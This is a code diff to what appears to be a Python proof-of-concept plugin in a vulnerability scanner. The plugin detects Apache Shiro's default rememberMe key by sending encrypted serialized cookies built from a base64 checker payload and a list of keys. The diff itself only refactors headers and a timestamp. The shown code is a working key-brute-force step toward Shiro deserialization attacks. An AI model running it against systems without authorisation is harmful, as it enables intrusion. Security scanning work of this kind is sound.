@@ -3,7 +3,7 @@
 '''
 Date: 2022-03-23 16:29:35
 LastEditors: recar
-LastEditTime: 2022-03-23 18:21:35
+LastEditTime: 2022-03-23 18:23:13
 '''
 from plugins.poc.base import PocBase
 import base64
@@ -55,7 +55,6 @@ keys = [
 
 checker = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
 
-headers={"User-Agent":"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36 Zxxz/1.0","Connection":"close"}
 
 
 class Poc(PocBase):
@@ -95,7 +94,7 @@ class Poc(PocBase):
                 cookie={"rememberMe":base64_ciphertext.decode()}
                 rsp = requests.get(
                     self.base_url, cookies=cookie,
-                    headers=headers,allow_redirects=False,
+                    headers=self.headers,allow_redirects=False,
                     verify=False)
                 if 'Set-Cookie' not in rsp.headers.keys() or "rememberMe=deleteMe" not in rsp.headers.get("Set-Cookie"):
                     return True, key
